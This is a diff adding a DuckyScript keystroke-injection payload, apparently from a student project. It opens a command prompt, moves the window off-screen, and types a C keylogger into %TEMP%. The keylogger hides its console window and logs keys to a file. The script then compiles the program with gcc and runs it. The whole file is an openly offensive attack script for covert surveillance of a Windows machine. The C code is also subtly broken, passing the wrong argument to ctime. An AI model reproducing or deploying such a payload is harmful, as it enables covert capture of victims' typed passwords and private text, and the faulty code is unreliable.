@@ -1,0 +1,130 @@
+REM Authors: Biloni Kim Aurore & Goloviatinski
+REM Name: script_create_c.txt
+REM Purpose: Write and compile a .c to .exe and start it
+
+REM Start cmd
+DEFAULT_DELAY 75
+DELAY 3000
+GUI r
+DELAY 1000
+STRING cmd
+DELAY 500
+ENTER
+DELAY 750
+ALT SPACE
+STRING M
+DOWNARROW
+REPEAT 100
+ENTER
+
+REM Go to temp directory
+STRING CD %TEMP%
+ENTER
+
+REM Make c file that write all the keyboard input in a file 
+REM Delete c & exe files if already exist
+STRING erase /Q canardage.c
+ENTER
+STRING erase /Q canardage.exe
+ENTER
+STRING copy con canardage.c
+ENTER
+
+REM minimised content of the file
+STRING #include <stdio.h>
+ENTER
+STRING #include <conio.h>
+ENTER
+STRING #include <windows.h>
+ENTER
+STRING #include <time.h>
+ENTER
+STRING #define PATH "C:/dev/canardage-log.txt"
+ENTER
+STRING int main() {
+ENTER
+STRING char capture; FILE *file; time_t t;
+ENTER
+STRING t = time(NULL);
+ENTER
+STRING HWND window;
+ENTER
+STRING AllocConsole();
+ENTER
+STRING window=FindWindowA("ConsoleWindowClass",NULL);
+ENTER
+STRING ShowWindow(window,0);
+ENTER
+STRING file = fopen(PATH, "a+");
+ENTER
+STRING fprintf(file, "DATE:%s\n", ctime(&time));
+ENTER
+STRING while(1) {
+ENTER
+STRING Sleep(20);
+ENTER
+STRING if(kbhit()) {
+ENTER
+STRING capture = getch();
+ENTER
+STRING switch((int)capture) {
+ENTER
+STRING case ' ':
+ENTER
+STRING fprintf(file, " ");
+ENTER
+STRING break;
+ENTER
+STRING case 0x09:
+ENTER
+STRING fprintf(file, "[TAB]");
+ENTER
+STRING break;
+ENTER
+STRING case 0x0D:
+ENTER
+STRING fprintf(file, "[ENTER]");
+ENTER
+STRING break;
+ENTER
+STRING case 0x1B:
+ENTER
+STRING fprintf(file, "[ESC]");
+ENTER
+STRING break;
+ENTER
+STRING case 0x08:
+ENTER
+STRING fprintf(file, "[BACKSPACE]");
+ENTER
+STRING break;
+ENTER
+STRING default:
+ENTER
+STRING fputc(capture, file);
+ENTER
+STRING }
+ENTER
+STRING if ((int)capture == 27) {
+ENTER
+STRING fclose(file);
+ENTER
+STRING return 0;
+ENTER
+STRING }
+ENTER
+STRING }
+ENTER
+STRING }
+ENTER
+STRING }
+ENTER
+CONTROL Z
+ENTER
+
+REM Compile c code to exe and start it
+STRING gcc .\canardage.c -o .\canardage.exe
+ENTER
+DELAY 3000
+STRING .\canardage.exe
+ENTER
